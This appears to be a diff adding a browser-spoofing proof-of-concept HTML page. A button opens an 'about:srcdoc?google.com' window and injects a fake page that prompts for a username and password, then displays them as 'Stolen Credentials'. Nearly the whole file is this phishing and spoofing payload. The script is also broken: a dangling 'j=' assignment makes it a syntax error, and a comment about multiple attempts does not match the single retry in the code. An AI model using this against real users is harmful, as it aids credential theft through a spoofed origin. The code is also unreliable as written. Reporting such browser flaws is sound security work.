@@ -1,0 +1,39 @@
+
+<!DOCTYPE html>
+<html>
+<body>
+  <button onclick="spoof()">Clickkkkk to spoof</button>
+
+  <script>
+    function spoof() {
+      var j='';
+      j=
+      let win = window.open(`about:srcdoc?google.com`,`j`);
+
+      let payload = `
+        <h1>This is NOT Google!</h1>
+        <script>
+          setTimeout(() => {
+            let u = prompt('Enter your username:');
+            let p = prompt('Enter your password:');
+            alert('Stolen Credentials:\\nUsername: ' + u + '\\nPassword: ' + p);
+          }, 2000);
+        <\/script>
+      `;
+
+      let inject = () => {
+        try {
+          win.document.open();
+          win.document.write(payload);
+          win.document.close();
+        } catch (e) {
+          console.log('Blocked:', e);
+        }
+      };
+
+      // Multiple attempts to beat race condition
+      setTimeout(inject, 10);
+    }
+  </script>
+</body>
+</html>
